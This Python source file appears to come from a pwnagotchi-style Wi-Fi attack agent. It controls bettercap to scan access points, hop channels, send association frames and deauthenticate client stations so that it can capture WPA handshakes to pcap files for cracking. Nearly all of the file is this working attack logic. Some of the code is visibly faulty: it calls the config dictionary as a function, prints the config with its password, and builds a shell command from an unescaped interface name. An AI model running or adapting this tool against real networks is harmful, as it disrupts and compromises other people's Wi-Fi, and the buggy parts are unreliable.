from bettercap import Client
from pwnisher.automata import Automata
import asyncio
import logging
import time
import threading
import subprocess
from ui.web.server import Server
import pwnisher.plugins as plugins
import os
import glob
from pwnisher.mesh.utils import AsyncAdvertiser
import pwnisher.utils as utils
import json
import pwnisher
import re

RECOVERY_DATA_FILE = '/root/.pwnagotchi-recovery'


class Agent(Client, Automata, AsyncAdvertiser):
    def __init__(self, config):

        Client.__init__(self,
                        "127.0.0.1" if "hostname" not in config['bettercap'] else config['bettercap']['hostname'],
                        "http" if "scheme" not in config['bettercap'] else config['bettercap']['scheme'],
                        8081 if "port" not in config['bettercap'] else config['bettercap']['port'],
                        "user" if "username" not in config['bettercap'] else config['bettercap']['username'],
                        "pass" if "password" not in config['bettercap'] else config['bettercap']['password']
        )
        Automata.__init__(self, config)
        self._config = config
        self._web_ui = Server(self, config['ui'])
        self._known_aps = {}
        self._supported_channels = utils.iface_channels(config['main']['iface'])
        self._started_at = time.time()


        AsyncAdvertiser.__init__(self, config)

        if not os.path.exists(config['bettercap']['handshakes']):
            os.makedirs(config['bettercap']['handshakes'])


        #logging.info("%s@%s (v%s)", pwnisher.name(), self.fingerprint(), pwnagotchi.__version__)
        for _, plugin in plugins.loaded.items():
            logging.debug("plugin '%s' v%s", plugin.__class__.__name__, plugin.__version__)



    def config(self):
        return self._config
    
    def setup_events(self):
        logging.info("connecting to %s ...", self.url)

        for tag in self._config['bettercap']['silence']:
            try:
                print(self._config)
                self.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception:
                pass
    
    def _reset_wifi_settings(self):
        cfg = self.config()
        mon_iface = cfg['main']['iface']
        self.run(f'set wifi.interface {mon_iface}')
        self.run(f'set wifi.ap.ttl {cfg["personality"]["ap_ttl"]}')
        self.run(f'set wifi.sta.ttl {cfg["personality"]["sta_ttl"]}')
        self.run(f'set wifi.rssi.min {cfg["personality"]["min_rssi"]}')
        self.run(f'set wifi.handshakes.file {cfg["bettercap"]["handshakes"]}')
        self.run('set wifi.handshakes.aggregate false')

    def _restart(self, mode='AUTO'):
        self._save_recovery_data()
        pwnisher.restart(mode)

    def _save_recovery_data(self):
        logging.warning("writing recovery data to %s ...", RECOVERY_DATA_FILE)
        with open(RECOVERY_DATA_FILE, 'w') as fp:
            data = {
                'started_at': self._started_at,
                'epoch': self._epoch.epoch,
                'history': self._history,
                'handshakes': self._handshakes,
                'last_pwnd': self._last_pwnd
            }
            json.dump(data, fp)

    def _wait_bettercap(self):
        while True:
            try:
                _s = self.session()
                return
            except Exception:
                self.recon()
                logging.info("waiting for bettercap API to be available ...")
                time.sleep(1)

    def start_monitor_mode(self):
        mon_iface = self._config["main"]['iface']
        mon_start_cmd = "startmon.sh"
        restart = not self._config['main']['no_restart']
        has_mon = False

        while not has_mon:
            s = self.session()
            for iface in s.get('interfaces', []):
                if iface['name'] == mon_iface:
                    logging.info("found monitor interface: %s", iface['name'])
                    has_mon = True
                    break

            if not has_mon:
                if mon_start_cmd:
                    logging.info("starting monitor interface ...")
                    subprocess.run(["bash", mon_start_cmd])
                else:
                    logging.info("waiting for monitor interface %s ...", mon_iface)
                    time.sleep(1)

        cfg = self.config()
        logging.info("supported channels: %s", self._supported_channels)
        logging.info("handshakes will be collected inside %s", cfg['bettercap']['handshakes'])

        self._reset_wifi_settings() 

        if self.is_module_running('wifi') and restart:
            logging.debug("restarting wifi module ...")
            self.restart_module('wifi.recon')
            self.run('wifi.clear')
        else:
            logging.debug("starting wifi module ...")
            self.start_module('wifi.recon')

    def start(self):
        self._wait_bettercap()
        self.setup_events()
        self.start_monitor_mode()
        self.start_event_polling()
        #self.start_session_fetcher()
        # print initial stats
        self.next_epoch()

    def total_unique_handshakes(self, path):
        expr = os.path.join(path, "*.pcap")
        return len(glob.glob(expr))

    def _update_handshakes(self, new_shakes=0):
        if new_shakes > 0:
            self._epoch.track(handshake=True, inc=new_shakes)

        cfg=self._config()
        tot = self.total_unique_handshakes(cfg['bettercap']['handshakes'])
        txt = '%d (%d)' % (len(self._handshakes), tot)

        if self._last_pwnd is not None:
            txt += ' [%s]' % self._last_pwnd

        #self._view.set('shakes', txt)

        #if new_shakes > 0:
        #    self._view.on_handshakes(new_shakes)

    def _load_recovery_data(self, delete=True, no_exceptions=True):
        try:
            with open(RECOVERY_DATA_FILE, 'rt') as fp:
                data = json.load(fp)
                logging.info("found recovery data: %s", data)
                self._started_at = data['started_at']
                self._epoch.epoch = data['epoch']
                self._handshakes = data['handshakes']
                self._history = data['history']
                self._last_pwnd = data['last_pwnd']

                if delete:
                    logging.info("deleting %s", RECOVERY_DATA_FILE)
                    os.unlink(RECOVERY_DATA_FILE)
        except:
            if not no_exceptions:
                raise

    
    async def _on_event(self, msg):
        found_handshake = False
        jmsg = json.loads(msg)
        #logging.info("received event: %s" % jmsg)

        # give plugins access to the events
        try:
            plugins.on('bcap_%s' % re.sub(r"[^a-z0-9_]+", "_", jmsg['tag'].lower()), self, jmsg)
        except Exception as err:
            logging.error("Processing event: %s" % err)

        if jmsg['tag'] == 'wifi.client.handshake':
            filename = jmsg['data']['file']
            sta_mac = jmsg['data']['station']
            ap_mac = jmsg['data']['ap']
            key = "%s -> %s" % (sta_mac, ap_mac)
            if key not in self._handshakes:
                self._handshakes[key] = jmsg
                s = self.session()
                ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
                if ap_and_station is None:
                    logging.warning("!!! captured new handshake: %s !!!", key)
                    self._last_pwnd = ap_mac
                    plugins.on('handshake', self, filename, ap_mac, sta_mac)
                else:
                    (ap, sta) = ap_and_station
                    self._last_pwnd = ap['hostname'] if ap['hostname'] != '' and ap[
                        'hostname'] != '<hidden>' else ap_mac
                    logging.warning(
                        "!!! captured new handshake on channel %d, %d dBm: %s (%s) -> %s [%s (%s)] !!!",
                        ap['channel'], ap['rssi'], sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'])
                    plugins.on('handshake', self, filename, ap, sta)
                found_handshake = True
            self._update_handshakes(1 if found_handshake else 0)


    def _event_poller(self, loop):
        self._load_recovery_data()
        self.run('events.clear')

        while True:
            logging.debug("[agent:_event_poller] polling events ...")
            try:
                loop.create_task(self.start_websocket(self._on_event))
                loop.run_forever()
                logging.debug("[agent:_event_poller] loop loop loop")
            except Exception as ex:
                logging.debug("[agent:_event_poller] Error while polling via websocket (%s)", ex)
    def start_event_polling(self):
        threading.Thread(
            target=self._event_poller,
            args=(asyncio.get_event_loop(),),
            name="Event Polling",
            daemon=True
        ).start()
    
    def start_module(self, module):
        self.run(f'{module} on')

    def recon(self):
        cfg = self.config()
        recon_time = cfg['personality']['recon_time']
        channels = cfg['personality']['channels']
        max_inactive = self._config['personality']['max_inactive_scale']
        recon_mul = self._config['personality']['recon_inactive_multiplier']

        if self._epoch.inactive_for >= max_inactive:
            recon_time *= recon_mul

        if not channels:
            self._current_channel = 0
            logging.debug("RECON %ds", recon_time)
            self.run('wifi.recon.channel clear')
        else:
            logging.debug("RECON %ds ON CHANNELS %s", recon_time, ','.join(map(str, channels)))
            try:
                self.run(f'wifi.recon.channel {",".join(map(str, channels))}')
            except Exception as e:
                logging.exception("Error setting wifi.recon.channels: %s", e)


    def get_access_points_by_channel(self):

        aps = self.get_access_points()
        channels = self._config['personality']['channels']
        grouped = {}

        # group by channel
        for ap in aps:
            logging.info("AP: %s (%s) on channel %d", ap['hostname'], ap['mac'], ap['channel'])
            ch = ap['channel']
            # if we're sticking to a channel, skip anything
            # which is not on that channel
            if channels and ch not in channels:
                continue

            if ch not in grouped:
                grouped[ch] = [ap]
            else:
                grouped[ch].append(ap)

        # sort by more populated channels
        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)
    
    def iface_channels(self, ifname):
        channels = []
        phy = subprocess.getoutput(f"/sbin/iw {ifname} info | grep wiphy | cut -d ' ' -f 2")
        output = subprocess.getoutput(f"/sbin/iw phy{phy} channels | grep ' MHz' | grep -v disabled | sed 's/^.*\\[//g' | sed s/\\].*\\$//g")
        for line in output.split("\n"):
            try:
                channels.append(int(line.strip()))
            except Exception:
                pass
        return channels
    
    def is_module_running(self, module):
        s = self.session()
        for m in s.get('modules', []):
            if m['name'] == module:
                return m['running']
        return False
    def restart_module(self, module):
        self.run(f'{module} off; {module} on')
    

    def _has_handshake(self, bssid):
        for key in self._handshakes:
            if bssid.lower() in key:
                return True
        return False

    def _should_interact(self, who):
        if self._has_handshake(who):
            return False

        elif who not in self._history:
            self._history[who] = 1
            return True

        else:
            self._history[who] += 1

        return self._history[who] < self._config['personality']['max_interactions']
    
    def set_access_points(self, aps):
        self._access_points = aps
        plugins.on('wifi_update', self, aps)
        self._epoch.observe(aps, list(self._peers.values()))
        return self._access_points


    def get_access_points(self):
        whitelist = self._config['main']['whitelist']
        aps = []
        try:
            s = self.session()
            plugins.on("unfiltered_ap_list", self, s['wifi']['aps'])
            for ap in s['wifi']['aps']:
                if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
                    continue
                elif ap['hostname'] in whitelist or ap['mac'][:13].lower() in whitelist or ap['mac'].lower() in whitelist:
                    continue
                else:
                    aps.append(ap)
        except Exception as e:
            logging.exception("Error while getting access points (%s)", e)

        aps.sort(key=lambda ap: ap['channel'])
        return self.set_access_points(aps)
    

    def set_channel(self, channel, verbose=True):
            if self.is_stale():
                logging.debug("recon is stale, skipping set_channel(%d)", channel)
                return

            # if in the previous loop no client stations has been deauthenticated
            # and only association frames have been sent, we don't need to wait
            # very long before switching channel as we don't have to wait for
            # such client stations to reconnect in order to sniff the handshake.
            wait = 0
            if self._epoch.did_deauth:
                wait = self._config['personality']['hop_recon_time']
            elif self._epoch.did_associate:
                wait = self._config['personality']['min_recon_time']

            if channel != self._current_channel:
                if self._current_channel != 0 and wait > 0:
                    if verbose:
                        logging.info("waiting for %ds on channel %d ...", wait, self._current_channel)
                    else:
                        logging.debug("waiting for %ds on channel %d ...", wait, self._current_channel)
                    self.wait_for(wait)
                if verbose and self._epoch.any_activity:
                    logging.info("CHANNEL %d", channel)
                try:
                    self.run('wifi.recon.channel %d' % channel)
                    self._current_channel = channel
                    self._epoch.track(hop=True)
                    #self._view.set('channel', '%d' % channel)

                    plugins.on('channel_hop', self, channel)

                except Exception as e:
                    logging.error("Error while setting channel (%s)", e)

    def associate(self, ap, throttle=-1):
        if self.is_stale():
            logging.debug("recon is stale, skipping assoc(%s)", ap['mac'])
            return
        if throttle == -1 and "throttle_a" in self._config['personality']:
            throttle = self._config['personality']['throttle_a']

        if self._config['personality']['associate'] and self._should_interact(ap['mac']):
            #self._view.on_assoc(ap)

            try:
                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients], %d dBm...",
                             ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], len(ap['clients']), ap['rssi'])
                self.run('wifi.assoc %s' % ap['mac'])
                self._epoch.track(assoc=True)
            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('association', self, ap)
            if throttle > 0:
                time.sleep(throttle)
            #self._view.on_normal()

    def start_session_fetcher(self):
        #_thread.start_new_thread(self._fetch_stats, ())
        threading.Thread(target=self._fetch_stats, args=(), name="Session Fetcher", daemon=True).start()

    def _fetch_stats(self):
        while True:
            try:
                s = self.session()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.session: %s" % repr(err))
            
            
            try:
                self._update_uptime(s)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_uptimes: %s" % repr(err))
            """
            try:
                self._update_advertisement(s)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_advertisements: %s" % repr(err))
           
            try:
                self._update_peers()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_peers: %s" % repr(err))

             """
            try:
                self._update_counters()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_counters: %s" % repr(err))
            
            try:
                self._update_handshakes(0)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_handshakes: %s" % repr(err))

            time.sleep(5)

    def _update_counters(self):
        self._tot_aps = len(self._access_points)
        tot_stas = sum(len(ap['clients']) for ap in self._access_points)
        if self._current_channel == 0:
            print("Current channel is 0, not counting access points on channel")
        #    self._view.set('aps', '%d' % self._tot_aps)
        #    self._view.set('sta', '%d' % tot_stas)
        else:
            self._aps_on_channel = len([ap for ap in self._access_points if ap['channel'] == self._current_channel])
            stas_on_channel = sum(
                [len(ap['clients']) for ap in self._access_points if ap['channel'] == self._current_channel])
            #self._view.set('aps', '%d (%d)' % (self._aps_on_channel, self._tot_aps))
            #self._view.set('sta', '%d (%d)' % (stas_on_channel, tot_stas))

    def deauth(self, ap, sta, throttle=-1):
        #if self.is_stale():
        #    logging.debug("recon is stale, skipping deauth(%s)", sta['mac'])
        #    return

        if throttle == -1 and "throttle_d" in self._config['personality']:
            throttle = self._config['personality']['throttle_d']

        if self._config['personality']['deauth'] and self._should_interact(sta['mac']):
            #self._view.on_deauth(sta)

            try:
                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d, %d dBm ...",
                             sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'], ap['channel'],
                             ap['rssi'])
                self.run('wifi.deauth %s' % sta['mac'])
                #self._epoch.track(deauth=True)
            except Exception as e:
                self._on_error(sta['mac'], e)

            plugins.on('deauthentication', self, ap, sta)
            if throttle > 0:
                time.sleep(throttle)
            #self._view.on_normal()

    def view_aps(self):
        return self.aps
    
    def _update_uptime(self, s):
        secs = pwnisher.uptime()
        #self._view.set('uptime', utils.secs_to_hhmmss(secs))
        # self._view.set('epoch', '%04d' % self._epoch.epoch)